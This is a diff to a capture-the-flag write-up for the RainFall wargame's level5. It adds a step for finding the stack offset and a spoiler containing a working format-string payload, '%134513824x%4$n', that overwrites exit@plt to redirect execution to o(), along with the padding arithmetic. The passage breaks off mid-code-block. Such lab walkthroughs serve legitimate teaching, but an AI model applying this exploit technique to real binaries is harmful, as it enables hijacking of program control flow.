@@ -56,22 +56,27 @@ To find the address we want to jump to, we will need to find the address of `o()
 Now to find the address offset where we need to write, we'll use the same concept as the previous exerices:
 
 ```bash
-level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%x " * 10' | ./level5
-8200 b7fd1ac0 b7ff37d0 8049838 25207825 78252078 20782520 25207825 78252078 20782520
+level5@RainFall:~$ ./level5                            
+AAAA %x %x %x %x 
+AAAA 200 b7fd1ac0 b7ff37d0 41414141 
 ```
 
-So this is out fourth offset!
+"AAAA" is written at the fourth offset as we can see with the "41414141"
 
 ## Payload
 
 This is what our payload will look like:
 
-`[address] + [adress to write]`
+`[address] + [adress to write as padding - 4 (addr bytes)] + [stack offset]`
 
 <details>
   <summary>Spoiler</summary>
 
-  We will write using the same trick as before `[offset$n]`:
+   `python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"' > /var/crash/tmp.txt`
+
+   134513828 (which is the decimal representation of the address of `o()`) now becomes 134513824. The reason being that printf counts the first 4 bytes that we wrote (the address of `exit@plt`) in its total written bytes, hence why we remove 4 to correctly write "134513828" at the correct adress. You can't see them when you `cat` the file, but you can see them using `xdd` and notice that they are indeed present (which makes perfect sense). When you cat the file, you get this `8%134513824x%4$n`, however printf receives `\x38\x98\x04\x08%134513824x%4$n` to interpret. 
+
+  We will write using the same trick as before `[offset$n]` which will write to the fourth address in the stack (which should be our first printf argument so the address):
 
   ```bash
   level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"' > /var/crash/exploit
